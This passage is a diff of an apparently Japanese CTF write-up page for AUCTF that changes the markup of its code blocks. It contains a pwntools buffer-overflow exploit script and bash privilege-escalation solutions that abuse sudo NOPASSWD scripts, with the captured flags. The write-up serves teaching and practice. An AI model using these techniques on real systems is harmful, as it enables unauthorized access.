+</span></span><span class="line"><span class="cl">   <span class="mh">0x565562fa</span> <span class="o">&lt;+</span><span class="mi">170</span><span class="o">&gt;:</span>	<span class="n">je</span>     <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x565562fc</span> <span class="o">&lt;+</span><span class="mi">172</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x14</span><span class="p">],</span><span class="mh">0x667463</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x56556303</span> <span class="o">&lt;+</span><span class="mi">179</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x56556305</span> <span class="o">&lt;+</span><span class="mi">181</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x1c</span><span class="p">],</span><span class="mh">0x2a</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x56556309</span> <span class="o">&lt;+</span><span class="mi">185</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x56556310</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x5655630b</span> <span class="o">&lt;+</span><span class="mi">187</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x56556360</span> <span class="o">&lt;</span><span class="n">print_flag</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x56556310</span> <span class="o">&lt;+</span><span class="mi">192</span><span class="o">&gt;:</span>	<span class="n">nop</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x56556311</span> <span class="o">&lt;+</span><span class="mi">193</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x56556314</span> <span class="o">&lt;+</span><span class="mi">196</span><span class="o">&gt;:</span>	<span class="n">leave</span>  
+</span></span><span class="line"><span class="cl">   <span class="mh">0x56556315</span> <span class="o">&lt;+</span><span class="mi">197</span><span class="o">&gt;:</span>	<span class="n">ret</span>   
+</span></span></code></pre></td></tr></table>
 </div>
 </div>
 <br>
@@ -709,7 +706,7 @@ fgets()の箇所でlocal_30に入力ができますが、バッファのサイ�
 ということで、書いたコードです。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -733,29 +730,29 @@ fgets()の箇所でlocal_30に入力ができますが、バッファのサイ�
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="k">if</span> <span class="mi">0</span><span class="p">:</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./turkey&#39;</span><span class="p">)</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;challenges.auctf.com&#39;</span><span class="p">,</span> <span class="mi">30011</span><span class="p">)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">16</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0000002a</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00000015</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00667463</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffeb</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00001337</span><span class="p">)</span>
-
-<span class="c1"># s.sendlineafter(&#34;all I got!\n\n&#34;, payload)</span>
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;all I got!</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-
-<span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./turkey&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;challenges.auctf.com&#39;</span><span class="p">,</span> <span class="mi">30011</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">16</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0000002a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00000015</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00667463</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffeb</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00001337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># s.sendlineafter(&#34;all I got!\n\n&#34;, payload)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;all I got!</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><br>
 <p>Flag: <code>auctf{I_s@id_1_w@s_fu11!}</code></p>
@@ -769,11 +766,11 @@ fgets()の箇所でlocal_30に入力ができますが、バッファのサイ�
 <br /><br />
 password is the flag of the previous Bash challenge</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-7">Solution</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -806,41 +803,41 @@ password is the flag of the previous Bash challenge</p>
 </span><span class="lnt">31
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -la
-total <span class="m">28</span>
-dr-xr-x--x <span class="m">1</span> level2 level2 <span class="m">4096</span> Apr  <span class="m">3</span> 16:00 .
-drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> 15:35 ..
--rw-r--r-- <span class="m">1</span> level2 level2  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
--rw-r--r-- <span class="m">1</span> level2 level2 <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
--rw-r--r-- <span class="m">1</span> level2 level2  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
--r--r----- <span class="m">1</span> level3 level3   <span class="m">22</span> Apr  <span class="m">1</span> 21:25 flag.txt
--r-xr-x--- <span class="m">1</span> level3 level2  <span class="m">110</span> Apr  <span class="m">1</span> 21:25 random_dirs.sh
-
-
-$ cat random_dirs.sh
-<span class="c1">#!/bin/bash</span>
-
-<span class="nv">x</span><span class="o">=</span><span class="nv">$RANDOM</span>
-
-base64 flag.txt &gt; /tmp/<span class="nv">$x</span>
-<span class="k">function</span> finish <span class="o">{</span>
-       rm  /tmp/<span class="nv">$x</span>
-<span class="o">}</span>
-<span class="nb">trap</span> finish EXIT
-
-sleep <span class="m">15</span>
-
-
-$ sudo -l
-Matching Defaults entries <span class="k">for</span> level2 on a522debb8813:
-    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User level2 may run the following commands on a522debb8813:
-    <span class="o">(</span>level3<span class="o">)</span> NOPASSWD: /home/level2/random_dirs.sh
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">28</span>
+</span></span><span class="line"><span class="cl">dr-xr-x--x <span class="m">1</span> level2 level2 <span class="m">4096</span> Apr  <span class="m">3</span> 16:00 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> 15:35 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> level2 level2  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> level2 level2 <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> level2 level2  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
+</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> level3 level3   <span class="m">22</span> Apr  <span class="m">1</span> 21:25 flag.txt
+</span></span><span class="line"><span class="cl">-r-xr-x--- <span class="m">1</span> level3 level2  <span class="m">110</span> Apr  <span class="m">1</span> 21:25 random_dirs.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ cat random_dirs.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">x</span><span class="o">=</span><span class="nv">$RANDOM</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">base64 flag.txt &gt; /tmp/<span class="nv">$x</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> finish <span class="o">{</span>
+</span></span><span class="line"><span class="cl">       rm  /tmp/<span class="nv">$x</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">trap</span> finish EXIT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sleep <span class="m">15</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> level2 on a522debb8813:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User level2 may run the following commands on a522debb8813:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>level3<span class="o">)</span> NOPASSWD: /home/level2/random_dirs.sh
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-みんなが同じマシンで作業してたので、ゴミファイルとかも結構あったし、結果として/tmpの下をモニターしているだけでフラグが取れちゃいました。</p>
+</div><br />
+みんなが同じマシンで作業してたので、ゴミファイルとかも結構あったし、結果として/tmpの下をモニターしているだけでフラグが取れちゃいました。
 <pre>
 $ cd /tmp
 $ find . -type f | xargs cat | grep -v try
@@ -849,12 +846,12 @@ YXVjdGZ7ZzB0dEBfbXV2X2Zhczd9Cg==
 :
 </pre>
 <p>（<code>grep -v try</code> は、他の人が作ったゴミをフィルターするだけのものです。）</p>
-<p><br /></p>
+<br />
 <pre>
 $ echo "YXVjdGZ7ZzB0dEBfbXV2X2Zhczd9Cg==" | base64 -d
 auctf{g0tt@_muv_fas7}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>auctf{g0tt@_muv_fas7}</code></p>
 <p>＃なにかを速く移動 (move fast) させないといけなかったのかな？</p>
 <p><br /><br />
@@ -867,11 +864,11 @@ auctf{g0tt@_muv_fas7}
 <br /><br />
 password is the flag of the previous Bash challenge</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-8">Solution</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -905,55 +902,53 @@ password is the flag of the previous Bash challenge</p>
 </span><span class="lnt">32
 </span><span class="lnt">33
 </span><span class="lnt">34
-</span><span class="lnt">35
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -la
-total <span class="m">28</span>
-dr-xr-x--x <span class="m">1</span> level3 level3 <span class="m">4096</span> Apr  <span class="m">3</span> 16:00 .
-drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> 15:35 ..
--rw-r--r-- <span class="m">1</span> level3 level3  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
--rw-r--r-- <span class="m">1</span> level3 level3 <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
--rw-r--r-- <span class="m">1</span> level3 level3  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
--r--r----- <span class="m">1</span> level4 level4   <span class="m">30</span> Apr  <span class="m">1</span> 21:25 flag.txt
--r-xr-x--- <span class="m">1</span> level4 level3  <span class="m">179</span> Apr  <span class="m">1</span> 21:25 passcodes.sh
-
-
-$ cat passcodes.sh
-<span class="c1">#!/bin/bash</span>
-
-<span class="nv">x</span><span class="o">=</span><span class="nv">$RANDOM</span>
-<span class="nb">echo</span> <span class="s2">&#34;Input the random number.&#34;</span>
-<span class="nb">read</span> input
-
-<span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$input</span><span class="s2">&#34;</span> -eq <span class="s2">&#34;</span><span class="nv">$x</span><span class="s2">&#34;</span> <span class="o">]]</span>
-<span class="k">then</span>
-	<span class="nb">echo</span> <span class="s2">&#34;AWESOME sauce&#34;</span>
-	cat flag.txt
-<span class="k">else</span>
-	<span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$input</span><span class="s2">&#34;</span>
-	<span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$x</span><span class="s2"> try again&#34;</span>
-<span class="k">fi</span>
-
-
-$ sudo -l
-Matching Defaults entries <span class="k">for</span> level3 on a95be49047ca:
-    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User level3 may run the following commands on a95be49047ca:
-    <span class="o">(</span>level4<span class="o">)</span> NOPASSWD: /home/level3/passcodes.sh
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">28</span>
+</span></span><span class="line"><span class="cl">dr-xr-x--x <span class="m">1</span> level3 level3 <span class="m">4096</span> Apr  <span class="m">3</span> 16:00 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> 15:35 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> level3 level3  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> level3 level3 <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> level3 level3  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
+</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> level4 level4   <span class="m">30</span> Apr  <span class="m">1</span> 21:25 flag.txt
+</span></span><span class="line"><span class="cl">-r-xr-x--- <span class="m">1</span> level4 level3  <span class="m">179</span> Apr  <span class="m">1</span> 21:25 passcodes.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ cat passcodes.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">x</span><span class="o">=</span><span class="nv">$RANDOM</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Input the random number.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">read</span> input
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$input</span><span class="s2">&#34;</span> -eq <span class="s2">&#34;</span><span class="nv">$x</span><span class="s2">&#34;</span> <span class="o">]]</span>
+</span></span><span class="line"><span class="cl"><span class="k">then</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">echo</span> <span class="s2">&#34;AWESOME sauce&#34;</span>
+</span></span><span class="line"><span class="cl">	cat flag.txt
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$input</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$x</span><span class="s2"> try again&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> level3 on a95be49047ca:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User level3 may run the following commands on a95be49047ca:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>level4<span class="o">)</span> NOPASSWD: /home/level3/passcodes.sh
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-（ちなみに、初日は <code>sudo -u level4 /home/level3/passcodes.sh</code> の実行にパスワードが要求されて、2日目には直っていました。）</p>
-<p><br />
-どれか1つ決め打ちで無限ループしたら、そのうち当たるだろう、というやり方です。</p>
+</div><br />
+（ちなみに、初日は `sudo -u level4 /home/level3/passcodes.sh` の実行にパスワードが要求されて、2日目には直っていました。）
+<br />
+どれか1つ決め打ちで無限ループしたら、そのうち当たるだろう、というやり方です。
 <pre>
 $ while true ; do echo 1 | sudo -u level4 /home/level3/passcodes.sh; done | grep -i auctf
 auctf{wut_r_d33z_RaNdom_numz}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>auctf{wut_r_d33z_RaNdom_numz}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -963,11 +958,11 @@ auctf{wut_r_d33z_RaNdom_numz}
 <blockquote>
 <p>ssh challenges.auctf.com -p 30040 -l level4</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-9">Solution</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1002,47 +997,47 @@ auctf{wut_r_d33z_RaNdom_numz}
 </span><span class="lnt">33
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -la
-total <span class="m">32</span>
-dr-xr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">4</span> 21:54 .
-drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> 15:35 ..
--rw-r--r-- <span class="m">1</span> level4 level4  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
--rw-r--r-- <span class="m">1</span> level4 level4 <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
--rw-r--r-- <span class="m">1</span> level4 level4  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
--r--r----- <span class="m">1</span> level5 level5   <span class="m">25</span> Apr  <span class="m">1</span> 21:25 flag.txt
--r-xr-x--- <span class="m">1</span> level5 level4  <span class="m">209</span> Apr  <span class="m">1</span> 21:25 print_file.sh
-
-
-$ cat print_file.sh
-<span class="c1">#!/bin/bash</span>
-
-<span class="k">if</span> <span class="o">[</span> ! -z <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span> <span class="o">]</span>
-<span class="k">then</span>
-	cat <span class="nv">$@</span> <span class="c1"># 2&gt;/dev/null</span>
-	<span class="c1"># if [ ! $? -eq 0 ]</span>
-	<span class="c1"># then</span>
-	<span class="c1"># 	echo &#34;Printing error. Check file permissions&#34;</span>
-	<span class="c1"># fi</span>
-<span class="k">else</span>
-	<span class="nb">echo</span> <span class="s2">&#34;Please enter a file.&#34;</span>
-	<span class="nb">echo</span> <span class="s2">&#34;./print_file FILENAME&#34;</span>
-<span class="k">fi</span>
-
-
-$ sudo -l
-Matching Defaults entries <span class="k">for</span> level4 on 7fe0b0d86907:
-    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User level4 may run the following commands on 7fe0b0d86907:
-    <span class="o">(</span>level5<span class="o">)</span> NOPASSWD: /home/level4/print_file.sh
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">32</span>
+</span></span><span class="line"><span class="cl">dr-xr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">4</span> 21:54 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> 15:35 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> level4 level4  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> level4 level4 <span class="m">3771</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bashrc
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> level4 level4  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
+</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> level5 level5   <span class="m">25</span> Apr  <span class="m">1</span> 21:25 flag.txt
+</span></span><span class="line"><span class="cl">-r-xr-x--- <span class="m">1</span> level5 level4  <span class="m">209</span> Apr  <span class="m">1</span> 21:25 print_file.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ cat print_file.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> ! -z <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span> <span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">then</span>
+</span></span><span class="line"><span class="cl">	cat <span class="nv">$@</span> <span class="c1"># 2&gt;/dev/null</span>
+</span></span><span class="line"><span class="cl">	<span class="c1"># if [ ! $? -eq 0 ]</span>
+</span></span><span class="line"><span class="cl">	<span class="c1"># then</span>
+</span></span><span class="line"><span class="cl">	<span class="c1"># 	echo &#34;Printing error. Check file permissions&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="c1"># fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">echo</span> <span class="s2">&#34;Please enter a file.&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">echo</span> <span class="s2">&#34;./print_file FILENAME&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> level4 on 7fe0b0d86907:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User level4 may run the following commands on 7fe0b0d86907:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>level5<span class="o">)</span> NOPASSWD: /home/level4/print_file.sh
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
 <pre>
 $ sudo -u level5 /home/level4/print_file.sh flag.txt
 auctf{FunKy_P3rm1ssi0nZ}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>auctf{FunKy_P3rm1ssi0nZ}</code></p>
 <p>＃ここにきて、何がFunkyなのか意味がわからなかったです。</p>
 <p><br /><br />
@@ -1053,11 +1048,11 @@ auctf{FunKy_P3rm1ssi0nZ}
 <blockquote>
 <p>ssh challenges.auctf.com -p 30040 -l level5</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-10">Solution</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
